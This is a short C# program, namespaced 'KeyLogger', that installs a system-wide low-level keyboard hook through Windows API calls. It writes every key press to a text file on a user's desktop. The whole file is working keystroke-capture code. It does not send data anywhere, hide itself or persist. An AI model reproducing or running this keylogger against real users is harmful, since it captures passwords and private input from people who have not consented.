using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using System.Reflection.Emit;

namespace KeyLogger
{
    static class Program
    {

        private static int WH_KEYBOARD_LL = 13; //type of hook proc; 13 value means monitoring low level keyboard inputs

        public static string user = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, hookProcedure lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);

        private delegate IntPtr hookProcedure(int ncode, IntPtr wParam, IntPtr lParam);

        private static IntPtr Callback(Int32 code, IntPtr wParam, IntPtr lParam)
        {
            Int32 vKey;
            if (code >= 0 && wParam == (IntPtr)0x0100)
            {
                vKey = Marshal.ReadInt32(lParam);
                StreamWriter output = new StreamWriter(@"C:\Users\hrakh\Desktop\mylog.txt", true);
                output.Write((Keys)vKey);
                output.Close();
            }
            return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }
        static void Main(String[] args)
        {
            hookProcedure callback = Callback;
            var module = Process.GetCurrentProcess().MainModule.ModuleName;
            var moduleHandle = GetModuleHandle(module);
            var hook = SetWindowsHookEx(WH_KEYBOARD_LL, callback, moduleHandle, 0);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }
    }
}
